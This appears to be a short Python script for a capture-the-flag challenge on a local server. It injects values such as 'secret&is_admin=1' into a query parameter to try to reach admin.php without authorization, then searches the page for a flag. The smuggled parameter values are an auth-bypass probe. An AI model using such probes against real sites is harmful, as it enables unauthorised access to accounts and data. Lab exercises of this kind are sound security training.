import urllib.request
import re

url = "http://127.0.0.1:33107"

# Test if we can bypass auth with query parameters
test_params = [
    ("category", "secret&is_admin=1"),
    ("category", "secret&admin=1"),
    ("category", "secret&role=admin")
]

cookies = urllib.request.HTTPCookieProcessor()
opener = urllib.request.build_opener(cookies)

for param, value in test_params:
    print(f"Testing: {param}={value}")
    
    # First access with injection
    inject_url = f"{url}/index.php?{param}={value}"
    req = urllib.request.Request(inject_url)
    resp = opener.open(req, timeout=10)
    
    # Then access admin
    admin_req = urllib.request.Request(f"{url}/admin.php")
    admin_resp = opener.open(admin_req, timeout=10)
    
    content = admin_resp.read().decode()
    print(f"Status: {admin_resp.status}, Length: {len(content)}")
    
    flag = re.search(r'FLAG\{[^}]+\}', content, re.I)
    if flag:
        print(f"[!] FLAG: {flag.group()}")
    elif admin_resp.status == 200:
        print(f"Preview: {content[:150]}")
    else:
        print("Failed to access admin")
        
    if admin_resp.status == 200:
        break

print("Test complete")
